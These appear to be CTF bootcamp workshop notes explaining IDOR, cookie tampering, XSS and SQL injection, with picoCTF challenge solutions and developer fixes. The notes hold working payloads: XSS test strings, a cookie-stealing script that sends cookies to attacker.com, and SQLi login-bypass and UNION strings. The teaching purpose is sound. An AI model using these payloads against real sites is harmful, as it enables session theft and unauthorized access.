# Day 2 — Web Vulnerabilities: IDOR, XSS & SQL Injection 💉

**Workshop:** GDG on Campus AUM · CTF Challenge Bootcamp  
**Date:** April 7, 2026  
**Category:** Web Exploitation

---

## Vulnerability 1: IDOR (Insecure Direct Object Reference)

### What Is It?
When a website uses predictable IDs to access data without checking if you're *allowed* to see it.

### How to Exploit
```
# You're logged in as user 1:
https://example.com/profile?id=1

# What if you change the number?
https://example.com/profile?id=2   ← Someone else's profile!
https://example.com/profile?id=0   ← Maybe an admin account?
```

### Where to Look
- URL parameters: `id=`, `user=`, `order=`, `file=`
- Any number in the URL that references a resource

### Real Impact
IDOR vulnerabilities have caused major data breaches — attackers can access any user's data by simply incrementing a number.

### How Developers Fix It
- Always verify permissions **server-side**
- Use UUIDs instead of sequential integers
- Never trust the client to enforce access control

---

## Vulnerability 2: Cookie Manipulation

### Why It Works
Some websites store roles/permissions in cookies and trust them without server-side verification. Since users can edit their own cookies, this is a critical mistake.

### Step-by-Step Attack
```
1. Open DevTools (F12) → Application tab
2. Click "Cookies" → select the domain
3. Look for: role=user, admin=false, isLoggedIn=0
4. Double-click the value → change it:
   role=admin
   admin=true  
   isLoggedIn=1
5. Refresh the page → check if access level changed
```

### Key Insight
> Cookies are stored on the **client** (your browser). Any client-side security check can be bypassed. Only server-side validation is trustworthy.

---

## Vulnerability 3: Cross-Site Scripting (XSS)

### What Is It?
When a website displays user input without sanitizing it, allowing injection of JavaScript that runs in other users' browsers.

### Types of XSS

| Type | How It Works | Impact |
|------|-------------|--------|
| Reflected | Input reflected immediately (e.g., search results) | Affects one user at a time |
| Stored | Input saved to database, shown to all visitors | Can affect all users |
| DOM-based | Vulnerability in client-side JavaScript | No server interaction needed |

### Common Payloads (CTF Use Only)
```javascript
// Basic test — does XSS work here?
<script>alert(1)</script>

// Without script tags (bypasses basic filters)
<img src=x onerror=alert(1)>

// In an attribute
" onmouseover="alert(1)

// Why XSS is dangerous — cookie theft
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### How Developers Fix It
- Sanitize all user input
- Encode output before rendering
- Implement Content Security Policy (CSP) headers

---

## Vulnerability 4: SQL Injection (SQLi)

### What Is It?
User input is inserted directly into a database query without sanitization, allowing manipulation of the query logic.

### Classic Example: Login Bypass
```sql
-- Normal query:
SELECT * FROM users WHERE username = 'alice' AND password = 'pass123'

-- If I type: ' OR 1=1 --  as the username:
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''
--                                        ↑ always true  ↑ rest commented out

-- Result: Logged in as first user (often admin)!
```

### Common Payloads

| Payload | Effect |
|---------|--------|
| `' OR 1=1 --` | Classic bypass — WHERE clause always true |
| `' OR '1'='1` | Alternative without comment syntax |
| `admin' --` | Login as "admin" specifically |
| `' UNION SELECT 1,2,3 --` | Retrieve data from other tables |

### Detection
> If typing a single quote `'` into an input field causes a database error → potential SQLi vulnerability.

### How Developers Fix It
- Use **parameterized queries** (prepared statements)
- Never concatenate user input into SQL strings
- Principle of least privilege for database accounts

---

## Challenges Practiced

### Cookies (picoCTF)
**Approach:** Edited cookie values in DevTools Application tab  
**Key Takeaway:** Never store authorization data in unprotected cookies

### Power Cookie (picoCTF)
**Approach:** Changed `isAdmin=0` to `isAdmin=1` in cookies  
**Key Takeaway:** Admin checks must happen server-side

### SQL Direct / SQLiLite (picoCTF)
**Approach:** Used `' OR 1=1 --` payload in login form  
**Key Takeaway:** Parameterized queries completely prevent this attack

---

## Tools Used
- **Browser DevTools** — cookie manipulation
- **Google XSS Game** (xss-game.appspot.com) — XSS practice
- **picoCTF** — SQLi and cookie challenges

## Key Takeaway
> The most common web vulnerabilities all share the same root cause: **trusting user input**. Never trust the client.
